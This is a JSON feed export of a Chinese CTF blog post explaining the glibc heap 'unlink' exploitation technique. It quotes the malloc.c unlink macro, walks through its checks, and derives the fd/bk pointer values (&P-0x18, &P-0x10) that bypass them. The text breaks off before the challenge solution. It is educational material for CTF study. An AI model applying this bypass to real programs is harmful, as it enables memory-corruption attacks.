{
    "version": "https://jsonfeed.org/version/1",
    "title": "cumt-08213014-cyb • All posts by \"堆\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/10/02/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/",
            "url": "https://vvwwvv.cn/2023/10/02/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/",
            "title": "堆利用之unlink（例题：hitcon2014_stkof）",
            "date_published": "2023-10-02T06:15:56.000Z",
            "content_html": "<p>libc 源码下载：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Z0cC5nbnUub3JnL2dudS9nbGliYy8=\">http://ftp.gnu.org/gnu/glibc/</span></p>\n<h1 id=\"1unlink\"><a class=\"anchor\" href=\"#1unlink\">#</a> 1.Unlink</h1>\n<p>这里参考了博客：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob2xsay5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMDg0ODE4ODk/c3BtPTEwMDEuMjAxNC4zMDAxLjU1MDI=\">https://hollk.blog.csdn.net/article/details/108481889?spm=1001.2014.3001.5502</span></p>\n<p><code>unlink</code>  是一个宏，定义在 malloc.c 里</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t      </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t      </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token operator\">||</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t       <span class=\"token string\">\"corrupted double-linked list (not small)\"</span><span class=\"token punctuation\">,</span>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t       P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                  FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t      </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t      </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t      </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>unlink</code>  是在进行 <code>free</code>  操作时执行的，看上面的源码知道是对 <code>链表</code> 的操作，这里是修改指针的效果（unlink <code>目的</code> 就是将一个空闲块 (在链表中) 拿出来，例如 free 时和目前物理相邻的 free chunk 进行合并），我的理解是 <code>unlink</code>  是将空闲的块在有新释放的块满足条件要合并时进行的操作，因为想要合并，就需要先将空闲的块从链表里取下来， <code>unlink</code>  就是在进行这个取下来的操作</p>\n<p>执行 <code>unlink</code>  的函数（在 <code>free函数</code> 执行了 <code>int_free()函数</code> ，其中调用了 <code>unlink</code>  宏）</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">_int_free</span> <span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">,</span> mchunkptr p<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> have_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">_int_free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ctfwiki 上的图片：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/02/pPLyMQA.png\" alt=\"\" /><br />\n这里就能发现是将中间的 <code>P</code>  给取了出来，修改了 <code>BK</code>  和 <code>FD</code>  的指针</p>\n<p>图里面的执行顺序为：</p>\n<ol>\n<li>P-&gt;fd=FD</li>\n<li>P-&gt;bk=BK</li>\n<li>FD-&gt;bk=BK</li>\n<li>BK-&gt;fd=FD</li>\n</ol>\n<p>上面的释放顺序为：</p>\n<ol>\n<li>\n<p>free(FD)</p>\n</li>\n<li>\n<p>free(P)</p>\n</li>\n<li>\n<p>free(BK)</p>\n<p>所以在 bin 中为： <code>BK-&gt;P&gt;FD </code>   的顺序</p>\n</li>\n</ol>\n<h1 id=\"2unlink检查机制\"><a class=\"anchor\" href=\"#2unlink检查机制\">#</a> 2.unlink 检查机制</h1>\n<p>由于 unlink 是在 free 函数中调用的，所以只需要检查 chunk 是否为空闲</p>\n<p>其检查机制有三个：</p>\n<ol>\n<li>检查被释放的 <code>chunk</code>  的 <code>size</code>  的值是否与相邻高地址的 <code>chunk</code>  的 <code>pre_size</code>  的大小相同（这里忽略 <code>p</code>  标志位， <code>p标志位</code> 为 size 最低位）【一个块为空闲时，相邻高地址块的 <code>pre_size</code>  为前一个块的大小（=size）】</li>\n<li>检查被释放 chunk 与相邻高地址的 <code>chunk</code>  的 <code>size</code>  的 <code>P标志位</code> 是否为 0， <code>p为0则表示前一个chunk空闲</code></li>\n<li>检查前后被释放 chunk 的 fd 和 bk</li>\n</ol>\n<h1 id=\"3unlink绕过\"><a class=\"anchor\" href=\"#3unlink绕过\">#</a> 3.unlink 绕过</h1>\n<p>我们想要利用 unlink，就需要绕过其检查，而上面的三个检查机制里前面两个通过溢出直接修改即可，后面的则需要我们进行一番操作</p>\n<h2 id=\"1关键检查\"><a class=\"anchor\" href=\"#1关键检查\">#</a> 1. 关键检查：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>            </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上面的是检查在 <code>空闲的链表</code> 中前后释放的 <code>chunk的指针</code> 是否对应正确</p>\n<h2 id=\"2绕过\"><a class=\"anchor\" href=\"#2绕过\">#</a> 2. 绕过</h2>\n<p>下面的图里我们可以看到空闲链表的结构：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/03/pPOVsYj.png\" alt=\"\" /></p>\n<p>这里我们可以知道各个指针指向的位置：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd<span class=\"token operator\">=</span>FD</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">-></span>bk<span class=\"token operator\">=</span>BK</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>FD<span class=\"token operator\">-></span>bk<span class=\"token operator\">=</span>P   <span class=\"token comment\">// 关键检查</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>BK<span class=\"token operator\">-></span>fd<span class=\"token operator\">=</span>P    <span class=\"token comment\">// 关键检查</span></pre></td></tr></table></figure><p>1. 这里我们知道 <code>FD</code>  从 <code>pre_size</code>  位到 <code>bk</code>  位需要 <code>0x18</code>  个大小（32 位是 12 个），也就是说 <code>&amp;FD+0x18=&amp;bk</code> , 而 <code>P-&gt;fd=FD</code>  并且 <code>FD的bk</code>  的值为 P 的地址，所以 <code>P-&gt;fd-&gt;bk=P&lt;=&gt;*(P-&gt;fd+0x18)=P</code></p>\n<p>这里 <code>*(P-&gt;fd+0x18)=P</code> <mark>&gt;P-&gt;fd+0x18=&amp;P</mark>&gt; <code>P-&gt;fd=&amp;P-0X18</code></p>\n<p>2. 同理知道 BK 的 <code>pre_size</code>  位到 <code>fd</code>  位需要 <code>0x10</code>  个大小（32 位是 8 个），即 <code>&amp;BK+0X10=&amp;fd</code> ，而 P-&gt;bk=BK 并且 BK 的 fd 的值为 P，所以 <code>P-&gt;bk-&gt;fd=P&lt;=&gt; *(P-&gt;bk+0x10)=P</code></p>\n<p>这里 <code>*(P-&gt;bk+0x10)=P</code> <mark>&gt;P-&gt;bk+0x10=&amp;P</mark>&gt; <code>P-&gt;bk=&amp;P-0X10</code></p>\n<p>也就是说我们最终通过：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk <span class=\"token operator\">==</span> P <span class=\"token operator\">&lt;=</span><span class=\"token operator\">></span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> P </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token operator\">-></span>bk<span class=\"token operator\">-></span>fd <span class=\"token operator\">==</span> P <span class=\"token operator\">&lt;=</span><span class=\"token operator\">></span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-></span>bk <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> P</pre></td></tr></table></figure><p>得到了：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr></table></figure><p><strong>这意味着当我们的 P 中的 <code>fd=&amp;P - 0x18 </code>  , <code>bk=&amp;P - 0x10</code>  就能绕过检查 (这里是将 fd 的 <code>内容</code>  设置为 (&amp;p-0x18)，将 bk 的 <code>内容</code> 设置为 (&amp;p-0x10) )</strong></p>\n<h2 id=\"3不同链表的unlinkfd_nextchunk和bk_prechunk分别为了方便在large-bins中快速地管理chunk块\"><a class=\"anchor\" href=\"#3不同链表的unlinkfd_nextchunk和bk_prechunk分别为了方便在large-bins中快速地管理chunk块\">#</a> 3. 不同链表的 unlink（fd_nextchunk 和 bk_prechunk 分别为了方便在 large bins 中快速地管理 chunk 块）</h2>\n<p>因为 P 的脱链操作只能在 <code>smallbin</code>  和 <code>largebin</code>  中（无法在 fastbin 中）进行，而这两个 bin 都是 <code>双向链表</code> ，所以我们必须修改 <code>前后</code>  chunk 的 fd 和 bk 指针</p>\n<p>上面已经得出了结论，这里有别人更详细的推导：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTU3ODcy\">https://cloud.tencent.com/developer/article/1557872</span></p>\n<h3 id=\"对于smallbin来说\"><a class=\"anchor\" href=\"#对于smallbin来说\">#</a> 对于 smallbin 来说：</h3>\n<p><code>smallbin</code>  通过上面的方式直接就可以完成脱链，因为 smallbin 中的 chunk 的  <code>fd_nextsize</code>  和  <code>bk_nextsize</code>  是没有意义的</p>\n<h3 id=\"对于largebin来说\"><a class=\"anchor\" href=\"#对于largebin来说\">#</a> 对于 largebin 来说：</h3>\n<p>对于 smallbin 来说，脱链操作上面就已经完成了，但是对于 largebin 来说，还有未完成的工作，因为 largebin 中还有 fdnextsize 以及 bknextsize 指针需要修改。</p>\n<p>在 largebin 中，也只有在相同尺寸的同一组 chunks 中的第一个 chunk 中  <code>fd_nextsize</code>  以及  <code>bk_nextsize</code>  才有意义。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>                \\</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当 <code>P-&gt;fdnextsize!=null</code>  时才需要修改（这里意味着 P 是 <code>这一组</code> 相同尺寸 chunk 的第一块 chunk），如果  <code>P-&gt;fdnextsize == null</code>  ，说明 P 是尺寸相同的一组 chunks 的非第一个 chunk，此时 P 的  <code>fdnextsize</code>  和 <code>bknextsize</code>  是没有意义的，自然没有修改的必要</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                    </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>                      </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                  FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>                                </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                    FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                    FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                    P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                    P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span>                               </pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>                                </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>           <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链（P 为 <code>这一组</code> 第一个 chunk）后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。</p>\n<p>接着判断 P-&gt;fd_nextsize == P ，因为当 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk 的话，是需要特别对待的，P 不为第一个时 FD 直接继承 P 的 fdnextsize 以及 bknextsize 即可。</p>\n<p>如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。（这里是每一个组的第一个都是满足这个条件）</p>\n<h1 id=\"4unlink利用\"><a class=\"anchor\" href=\"#4unlink利用\">#</a> 4.Unlink 利用</h1>\n<p>由上面的绕过可以得知:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr></table></figure><p>而在 unlink 宏中：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 在这里 BK=P->bk\t\t\t\t\t      </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t        <span class=\"token comment\">// 在这里 FD=P->fd</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>通过我们进行的绕过手段导致这里也就相当于：</p>\n<pre><code>FD-&gt;bk = BK  并且  BK=P-&gt;bk\n所以FD-&gt;bk=P-&gt;bk\n\nBK-&gt;fd = FD   并且  FD=P-&gt;fd\n所以BK-&gt;fd =P-&gt;fd\n</code></pre>\n<p>因此这也就是：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span>  <span class=\"token comment\">// 事实上 FD->bk=BK (这里实际上是因为已经在链表中去除 P 后会根据之前 P 的 fd 和 bk 来确定修改后的指针的指向)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>BK<span class=\"token operator\">-></span>fd  <span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span>  <span class=\"token comment\">// 事实上 BK->fd=FD</span></pre></td></tr></table></figure><p><img 